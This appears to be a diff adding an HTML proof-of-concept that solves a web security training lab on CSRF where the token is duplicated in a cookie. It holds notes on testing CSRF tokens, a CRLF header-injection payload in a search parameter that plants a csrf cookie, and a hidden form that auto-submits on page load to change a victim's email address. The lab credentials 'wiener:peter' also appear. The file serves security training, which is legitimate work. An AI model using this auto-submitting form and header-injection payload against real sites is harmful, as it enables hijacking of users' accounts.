@@ -1,0 +1,48 @@
+<html>
+    <body>
+        <!--
+            Lab #6 - CSRF where token is duplicated in cookie
+
+            Vulnerable parametr - email change functionality
+
+            Goal - exploit CSRF to change email address
+
+            Creds - wiener:peter
+
+            Analysis:
+
+            In order for a CSRF attack to be possible:
+            - A relevant action: change a users email
+            - Cookie-based session handlinf: session cookie
+            - No unpredictable request parameter
+
+            Testing CSRF Tokens:
+            1. Remove the CSRF token and see if application accepts request
+            2. Change the request method from POST to GET
+            3. See if CSRF token is tied to user session
+
+            Testing CSRF Tokens and CSRF cookies:
+            1. Check if the CSRF token is tied to the CSRF cookie
+                - Submit an invalid CSRF token
+                - Submit a valid CSRF token from another usesr
+            2. Submit valid CSRF token and cookie from another user
+
+            In order to exploit this vulnerability, we need to perform 2 things:
+            1. Inject a csrf cookie in the user's session (HTTP Header injection) - satisfied
+            - search in search bar => send GET request to repeater and change GET /?search=test%0d%0aSet-Cookie:%20csrfKey=8tYmkgsHVM1Hk0L9kNxEvHWsM9dgEjX6
+            2. Send a CSRF attack to the victim with a known csrf token
+
+           
+
+        -->
+        <script>history.pushState('', '', '/')</script>
+        <form action="accb1f671e8f9724c066022200a300d6.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="sarlot@hacker.com"/>
+            <input type="hidden" name="csrf" value="test"/>
+            <input type="submit" value="Submit request"/>
+        </form>
+            <img src="https://accb1f671e8f9724c066022200a300d6.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test" onerror="document.forms[0].submit()">
+    </body>
+</html>
+
+
